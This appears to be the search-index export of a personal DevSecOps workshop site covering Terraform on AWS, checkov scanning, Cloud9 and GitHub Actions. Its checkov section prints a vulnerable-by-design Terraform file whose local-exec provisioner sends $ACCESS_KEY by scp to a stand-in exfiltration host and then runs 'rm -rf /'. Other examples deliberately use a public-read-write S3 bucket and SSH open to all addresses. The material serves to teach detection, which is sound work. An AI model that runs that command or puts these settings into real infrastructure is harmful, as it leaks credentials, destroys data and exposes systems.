[
{
	"uri": "http://localhost:1313/ws02/",
	"title": " Cloud DevSecOps ",
	"tags": [],
	"description": "",
	"content": "Cloud DevSecOpsCloud DevSecOps with Hashicorp, Palo Alto Networks \u0026amp; AWS This workshop will demonstrate how to leverage infrastructure as code (IaC) and DevSecOps patterns to automate, scale, and improve the security posture of cloud infrastructure and applications. We will create a pipeline that ensures our configurations are secure and compliant from code to cloud.\nThis guide provides step-by-step instructions to integrate Prisma Cloud (and checkov) with Terraform Cloud, GitHub, VScode and AWS.\nContent Introduction Prepairation Configuration Cleanup "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.1-aws/",
	"title": "Configure IAM User and API Key",
	"tags": [],
	"description": "",
	"content": "From the AWS console, select IAM or search for \u0026lsquo;IAM\u0026rsquo; in the Search bar if not displayed. In the IAM Dashboard, click Users on the left sidebar. Click the Create User button on the top right. Specify a User name that will be unique then click Next. Next, set the permissions for the user by selecting Attach policies directly and attaching the AdministratorAccess policy. Review the user details and click Create user. Now we need to assign an API key to the user we just created. Click on the user you just created from the IAM Dashboard and then click Create access key on the right. Select Other from the Access Key options. Optionally, supply a tag to associate with the Access Key, then click Create access key. Finally, save the Access Key data provided (copy to a local file). This credential will be used to deploy resources to AWS in a later section. When ready, click Done. An access key will now appear on the User details page. "
},
{
	"uri": "http://localhost:1313/ws02/3-config/3.1-ec2/",
	"title": "IaC",
	"tags": [],
	"description": "",
	"content": "In this Workshop we will create an EC2 instances with the information bellow\nOverview AWS EC2 Instances name: Web-Server VPC: 10.0.0.0/16 Subnets: 10.0.1.0/24 Region: Singapore (ap-southeast-1) Available zone: ap-southeast-1b Instance type: t2.micro Amazon Machine Images: Amazon Linux 2 AMI Key pair: tf-cli-keypair Security setting: Only allow my ip connect SSH to EC2 instance Allow all access from port 8080 to EC2 instance Terraform configuration Security credential variables: variables.tf\nvariable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } variable \u0026#34;region\u0026#34; { type = string default = \u0026#34;ap-southeast-1\u0026#34; } Instances configurations :main.tf\nvariable vpc_cidr_block {} variable subnet_1_cidr_block {} variable avail_zone {} variable env_prefix {} variable instance_type {} variable my_ip {} variable ami_id {} resource \u0026#34;aws_vpc\u0026#34; \u0026#34;myapp-vpc\u0026#34; { cidr_block = var.vpc_cidr_block tags = { Name = \u0026#34;${var.env_prefix}-vpc\u0026#34; } } resource \u0026#34;aws_subnet\u0026#34; \u0026#34;myapp-subnet-1\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id cidr_block = var.subnet_1_cidr_block availability_zone = var.avail_zone tags = { Name = \u0026#34;${var.env_prefix}-subnet-1\u0026#34; } } resource \u0026#34;aws_security_group\u0026#34; \u0026#34;myapp-sg\u0026#34; { name = \u0026#34;myapp-sg\u0026#34; vpc_id = aws_vpc.myapp-vpc.id ingress { from_port = 22 to_port = 22 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } ingress { from_port = 8080 to_port = 8080 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } egress { from_port = 0 to_port = 0 protocol = \u0026#34;-1\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] prefix_list_ids = [] } tags = { Name = \u0026#34;${var.env_prefix}-sg\u0026#34; } } resource \u0026#34;aws_internet_gateway\u0026#34; \u0026#34;myapp-igw\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id tags = { Name = \u0026#34;${var.env_prefix}-internet-gateway\u0026#34; } } resource \u0026#34;aws_route_table\u0026#34; \u0026#34;myapp-route-table\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id route { cidr_block = \u0026#34;0.0.0.0/0\u0026#34; gateway_id = aws_internet_gateway.myapp-igw.id } # default route, mapping VPC CIDR block to \u0026#34;local\u0026#34;, created implicitly and cannot be specified. tags = { Name = \u0026#34;${var.env_prefix}-route-table\u0026#34; } } # Associate subnet with Route Table resource \u0026#34;aws_route_table_association\u0026#34; \u0026#34;a-rtb-subnet\u0026#34; { subnet_id = aws_subnet.myapp-subnet-1.id route_table_id = aws_route_table.myapp-route-table.id } output \u0026#34;server-ip\u0026#34; { value = aws_instance.myapp-server.public_ip } resource \u0026#34;aws_instance\u0026#34; \u0026#34;myapp-server\u0026#34; { ami = var.ami_id instance_type = var.instance_type key_name = \u0026#34;tf-cli-keypair\u0026#34; associate_public_ip_address = true subnet_id = aws_subnet.myapp-subnet-1.id vpc_security_group_ids = [aws_security_group.myapp-sg.id] availability_zone\t= var.avail_zone tags = { Name = \u0026#34;${var.env_prefix}-server\u0026#34; } } Terraform provider AWS : terraform.tfvars\n# Network and Instance variables vpc_cidr_block = \u0026#34;10.0.0.0/16\u0026#34; subnet_1_cidr_block = \u0026#34;10.0.1.0/24\u0026#34; avail_zone = \u0026#34;ap-southeast-1b\u0026#34; env_prefix = \u0026#34;web\u0026#34; my_ip = \u0026#34;\u0026lt;myip\u0026gt;/32\u0026#34; ami_id = \u0026#34;ami-04f73ca9a4310089f\u0026#34; Installation Terraform plan:\ndocker-compose run –rm terraform plan Terraform apply:\ndocker-compose run --rm terraform apply --auto-approve AWS Instance checking: Add Keypair permission:\nchmod 400 tf-cli-keypair.pem SSH to EC2 Instances:\nssh -i tf-cli-keypair.pem ec2-user@13.250.64.49 AWS Instance checking: "
},
{
	"uri": "http://localhost:1313/ws02/1-intro/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "In this workshop, we will learn how to:\nGain an understanding of DevSecOps and infrastructure as code (IaC) using Terraform Scan IaC files for misconfigurations locally Set up CI/CD pipelines to automate security scanning and policy enforcement Fix security findings and AWS resource misconfigurations with Prisma Cloud DevSecOps\nThe foundation of DevSecOps lies in the DevOps movement, wherein development and operations functions have merged to make deployments faster, safer, and more repeatable. Common DevOps practices include automated infrastructure build pipelines (CI/CD) and version-controlled manifests (GitOps) to make it easier to control cloud deployments. By baking software and infrastructure quality requirements into the release lifecycle, teams save time manually reviewing code, letting teams focus on shipping features\nAs deployments to production speed up, many traditional cloud security concepts break down. With the rise of containerized technologies, serverless functions, and IaC frameworks, it is increasingly harder to maintain visibility of cloud security posture.\nBy leveraging DevOps foundations, security and development teams can build security scanning and policy enforcement into automated pipelines. The ultimate goal with DevSecOps is to “shift cloud security left.” What shifting cloud security left means is automating it and embedding it earlier into the development lifecycle so that actions can be taken earlier. Preventing risky deployments is a more proactive approach to traditional cloud security which often slows down development teams with deployment rollbacks and disruptive fixes.\nTo successfully implement DevSecOps, it is critical that teams building secure infrastructure must embracing existing tools and workflows. At Palo Alto Networks, we’re committed to making it as simple, effective, and painless as possible to automate security controls and integrate them seamlessly into standard workflows.\nInfrastructure as Code Using Terraform\nInfrastructure as code (IaC) frameworks, such as HashiCorp Terraform, make cloud provisioning scalable and straightforward by leveraging automation and code. Defining our cloud infrastructure in code simplifies repetitive DevOps tasks and gives us a versioned, auditable source of truth for the state of an environment.\nTerraform is useful for defining resource configurations and interacting with APIs in a codified, stateful manor. Any updates we want to make, such as adding more instances or changes to a configuration, can be handled by Terraform.\nFor example, the following Terraform resource block defines a simple AWS S3 bucket:\nresource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;data\u0026#34; { bucket = \u0026#34;my_bucket_name\u0026#34; acl = \u0026#34;public-read-write\u0026#34; } After performing terraform init we can provision an S3 bucket with the following command:\nterraform apply Any changes made to the resource definition within a .tf file, such as adding tags or changing the acl, can be pushed with the terraform apply command.\nAnother benefit of using Terraform to define infrastructure is that code can be scanned for misconfigurations before the resource is created. This allows for security controls to be integrated into the development process, preventing issues from being introduced, deployed and exploited.\nAWS Cloud9 IDE\nTo ensure we all have the same environent configuration, we will use AWS Cloud9, a cloud-delivered IDE from AWS, to carry out many of the steps in this workshop. AWS Cloud9 is a cloud-based integrated development environment (IDE) that lets you write, run, and debug your code with just a browser. It includes a code editor, debugger, and terminal. Cloud9 comes pre-packaged with essential tools for popular programming languages and the AWS Command Line Interface (CLI) pre-installed so you don’t need to install files or configure your laptop for this workshop.\nYour Cloud9 environment will have access to the same AWS resources as the user with which you logged into the AWS Management Console. We strongly recommend using Cloud9 to complete this workshop.\nCloud9 works best with Chrome or Firefox, not Safari. It cannot be used from a tablet.\nCheckov\nCheckov is an open source \u0026lsquo;policy-as-code\u0026rsquo; tool that scans cloud infrastructure defintions to find misconfigurations before they are deployed. Some of the key benefits of checkov:\nRuns as a command line interface (CLI) tool Supports many common plaftorms and frameworks Ships with thousands of default policies Works on windows/mac/linux (any system with python installed) Content Introduction Prepairation Configure Cleanup "
},
{
	"uri": "http://localhost:1313/ws02/3-config/3.2-jenkins/",
	"title": "CICD",
	"tags": [],
	"description": "",
	"content": "Updating \u0026hellip;.\n"
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.2-c9/",
	"title": "Configure AWS Cloud9 IDE",
	"tags": [],
	"description": "",
	"content": "Select Services then select Cloud9 under Developer Tools or enter it into the Search bar. On the Cloud9 Environments page, click Create Environment Enter a Name for the Environemnt and select New EC2 instance for Environment Type. Select Additional instance types then choose t2.micro from the drop-down. With this workshop , they use a default setting\nLeave all other options on default setting and click Create. In my workshop, i will set up a manual network by myself\nReview:\n1 2 VPC Subnets Route tables Internet Gateways Security Groups Networking for Cloud9: Once the environment is created, navigate to it and click Open in Cloud9 to launch the IDE. Close all of the default windows, then create a New Terminal window. Congrats! Cloud9 is now ready to use. Before installing checkov or pulling code to scan, create and activate a python virtual environment to better organize python packages.\npython3 -m venv env source ./env/bin/activate "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/",
	"title": "Prepairation",
	"tags": [],
	"description": "",
	"content": "Setup / Prerequisities Github account Terraform Cloud account AWS account (provided during workshop) Prisma Cloud account (OPTIONAL) Contents Docker AWS Teraform Git "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.3-checkov/",
	"title": "Code Scanning with checkov",
	"tags": [],
	"description": "",
	"content": "Install checkov\nTo get started, install checkov using pip:\npip3 install checkov Use the \u0026ndash;version and \u0026ndash;help flags to verify the install and view usage / optional arguements\ncheckov --version checkov --help To see a list of every policy that Checkov can enforce, use the -l or \u0026ndash;list options.\ncheckov --list Now that you see what checkov can do, let\u0026rsquo;s get some code to scan\u0026hellip;\nFork and clone target repository\nThis workshop involves code that is vulnerable-by-design. All of the necessary code is contained within this repository or workshop guide itself.\nTo begin, log into Github and navigate to the Prisma Cloud DevSecOps Workshop repository. Create a Fork of this repositry to create a copy of the code in your own account Ensure the selected Owner matches your username, then proceed to fork the repository by clicking Create fork. Grab the repo URL from Github, then clone the forked repository to Cloud9. git clone https://github.com/nonotnonez/prisma-cloud-devsecops-workshop.git cd prisma-cloud-devsecops-workshop/ git status Great! Now we have some code to scan. Let\u0026rsquo;s jump in\u0026hellip;\nScan with checkov\nCheckov can be configured to scan files and enforce policies in many different ways. To highlight a few:\nScans can run on individual files or entire directories. Policies can be selected through selection or omission. Enforcement can be determined by flags that control checkov\u0026rsquo;s exit code. Let\u0026rsquo;s start by scanning the entire ./code directory and viewing the results.\ncd code/ checkov -d . Failed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.\nNow try running checkov on an individual file with checkov -f .\ncheckov -f deployment_ec2.tf checkov -f simple_ec2.tf Expand simple_ec2.tf provider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_ec2_host\u0026#34; \u0026#34;test\u0026#34; { instance_type = \u0026#34;t3.micro\u0026#34; availability_zone = \u0026#34;us-west-2a\u0026#34; provisioner \u0026#34;local-exec\u0026#34; { command = \u0026#34;echo Running install scripts.. \u0026#39;echo $ACCESS_KEY \u0026gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /\u0026#39; \u0026#34; } } Policies can be optionally enforced or skipped with the \u0026ndash;check and \u0026ndash;skip-check flags.\ncheckov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52 checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52 Frameworks can also be selected or omitted for a particular scan:\ncheckov -d . --framework secrets --enable-secret-scan-all-files checkov -d . --skip-framework dockerfile Lastly, enforcement can be more granularly controlled by using the --soft-fail option. Applying --soft-fail results in the scan always returning a 0 exit code. Using --hard-fail-on overrides this option.\nCheck the exit code when running checkov -d . with and without the \u0026ndash;soft-fail option.\ncheckov -d . ; echo $? checkov -d . --soft-fail ; echo $? An example of using --soft-fail and exit codes in a pipeline context will be demosntrated in a later section.\nCustom Policies\nCheckov supports the creation of Custom Policies for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the \u0026ndash;external-checks-dir or \u0026ndash;external-checks-git flags.\nLet\u0026rsquo;s create a custom policy to check for local-exec and remote-exec Provisioners being used in Terraform resource definitons. (Follow link to learn more about provisioners and why it is a good idea to check for them).\nmetadata: name: \u0026#34;Terraform contains local-exec and/or remote-exec provisioner\u0026#34; id: \u0026#34;CKV2_TF_1\u0026#34; category: \u0026#34;GENERAL_SECURITY\u0026#34; definition: and: - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/local-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/remote-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; Add the above code to a new file within a new direcotry.\nmkdir custom-checks/ vim custom-checks/check.yaml Save the file. Then run checkov with the \u0026ndash;external-checks-dir to test the custom policy.\ncheckov -f simple_ec2.tf --external-checks-dir custom-checks IDE plugin\nRequires API key for Prisma Cloud.\nFollow links: https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/3-section1/4-ide-plugin\n"
},
{
	"uri": "http://localhost:1313/ws02/3-config/",
	"title": "Configuration",
	"tags": [],
	"description": "",
	"content": " The Projects for the workshop \u0026hellip;.. Content IaC CICD "
},
{
	"uri": "http://localhost:1313/ws02/4-cleanup/4.1-ec2/",
	"title": "IaC",
	"tags": [],
	"description": "",
	"content": "Clean up resources We will process to clearn up all the resources\nTerraform: Run docker compose:\ndocker-compose run --rm terraform destroy --auto-approve AWS Checking "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.4-git/",
	"title": "Integrate with Github Actions",
	"tags": [],
	"description": "",
	"content": "You can leverage GitHub Actions to run automated scans for every build or specific builds, such as the ones that merge into the master branch. This action can alert on misconfigurations, or block code from being merged if certain policies are violated. Results can also be sent to Prisma Cloud and other sources for further review and remediation steps.\nLet\u0026rsquo;s begin by setting an action from the repository page, under the Actions tab. Then click on set up a workflow yourself -\u0026gt; to create a new action from scratch.\n"
},
{
	"uri": "http://localhost:1313/ws02/4-cleanup/",
	"title": "Resource Cleanup",
	"tags": [],
	"description": "",
	"content": "Clean up resources All processing to clearn up all the resources\nContent IAC CICD "
},
{
	"uri": "http://localhost:1313/ws02/4-cleanup/4.2-jenkins/",
	"title": "CICD",
	"tags": [],
	"description": "",
	"content": "We are processing \u0026hellip;.\n"
},
{
	"uri": "http://localhost:1313/ws02/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "http://localhost:1313/ws02/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]